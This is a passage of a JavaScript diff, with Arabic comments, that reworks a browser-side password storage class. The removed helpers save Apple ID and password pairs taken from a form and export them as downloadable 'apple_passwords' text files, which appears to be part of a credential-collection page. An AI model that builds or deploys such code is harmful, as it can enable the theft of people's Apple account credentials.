+                enabled: this.settings.encryption,
+                hasKey: !!this.encryptionKey
             },
-            specialChars: 0,
-            numbers: 0,
-            uppercase: 0,
-            commonPatterns: []
+            lastUpdate: localStorage.getItem('passwords_last_save') || 'never'
         };
-        
-        this.passwords.forEach(pass => {
-            const pwd = pass.password;
-            
-            // حسب الطول
-            const length = pwd.length;
-            analysis.byLength[length] = (analysis.byLength[length] || 0) + 1;
-            
-            // قوة كلمة المرور
-            let score = 0;
-            if (length >= 8) score++;
-            if (/[A-Z]/.test(pwd)) score++;
-            if (/[a-z]/.test(pwd)) score++;
-            if (/[0-9]/.test(pwd)) score++;
-            if (/[^A-Za-z0-9]/.test(pwd)) score++;
-            
-            if (score <= 2) analysis.strength.weak++;
-            else if (score <= 4) analysis.strength.medium++;
-            else analysis.strength.strong++;
-            
-            // تحليل الأحرف
-            if (/[!@#$%^&*]/.test(pwd)) analysis.specialChars++;
-            if (/[0-9]/.test(pwd)) analysis.numbers++;
-            if (/[A-Z]/.test(pwd)) analysis.uppercase++;
-            
-            // اكتشاف الأنماط الشائعة
-            const commonPatterns = ['123', 'abc', 'qwerty', 'password', 'admin'];
-            commonPatterns.forEach(pattern => {
-                if (pwd.toLowerCase().includes(pattern)) {
-                    analysis.commonPatterns.push(pattern);
-                }
-            });
-        });
-        
-        return analysis;
-    }
-    
-    // إنشاء تقرير أمني
-    generateSecurityReport() {
-        const analysis = this.analyzePasswords();
-        const report = {
-            generatedAt: new Date().toISOString(),
-            summary: analysis,
-            recommendations: []
-        };
-        
-        // توصيات أمنية
-        if (analysis.strength.weak > 0) {
-            report.recommendations.push({
-                issue: `${analysis.strength.weak} كلمات مرور ضعيفة`,
-                suggestion: 'تأكد من استخدام كلمات مرور قوية تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز'
-            });
-        }
-        
-        if (analysis.commonPatterns.length > 0) {
-            report.recommendations.push({
-                issue: 'تم اكتشاف أنماط شائعة في كلمات المرور',
-                suggestion: 'تجنب استخدام الأنماط المتوقعة مثل "123" أو "password"'
-            });
-        }
-        
-        if (analysis.total > 50) {
-            report.recommendations.push({
-                issue: 'عدد كبير من كلمات المرور المخزنة',
-                suggestion: 'فكر في تصدير وحذف البيانات القديمة للحفاظ على الأمان'
-            });
-        }
-        
-        return report;
     }
 }
 
-// إنشاء وتصدير نظام تخزين كلمات المرور
-const passwordStorage = new PasswordStorageSystem();
-window.passwordStorage = passwordStorage;
+// تصدير النظام للاستخدام العالمي
+window.PasswordStorage = PasswordStorage;
 
-// دمج مع نظام Kelog
-if (window.kelogSystem) {
-    window.kelogSystem.log('تهيئة نظام تخزين كلمات المرور', {
-        version: '1.0',
-        encryption: true
-    }, 'security');
+// تهيئة النظام تلقائياً
+if (typeof window !== 'undefined') {
+    window.addEventListener('DOMContentLoaded', async () => {
+        if (!window.passwordStorage) {
+            window.passwordStorage = new PasswordStorage();
+            console.log('🔐 Password Storage loaded globally as window.passwordStorage');
+        }
+    });
 }
 
-console.log('🔐 نظام تخزين كلمات المرور جاهز!');
-
-// دالة مساعدة لإضافة كلمة مرور من النموذج
-window.saveApplePassword = function(appleId, password, additionalData = {}) {
-    return passwordStorage.addPassword(appleId, password, additionalData);
-};
-
-// دالة مساعدة لتصدير كلمات المرور
-window.exportApplePasswords = function(format = 'txt') {
-    const files = passwordStorage.exportPasswords();
-    if (files && files[format]) {
-        const blob = new Blob([files[format]], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `apple_passwords_${Date.now()}.${format}`;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-        return true;
-    }
-    return false;
-};
+export default PasswordStorage;
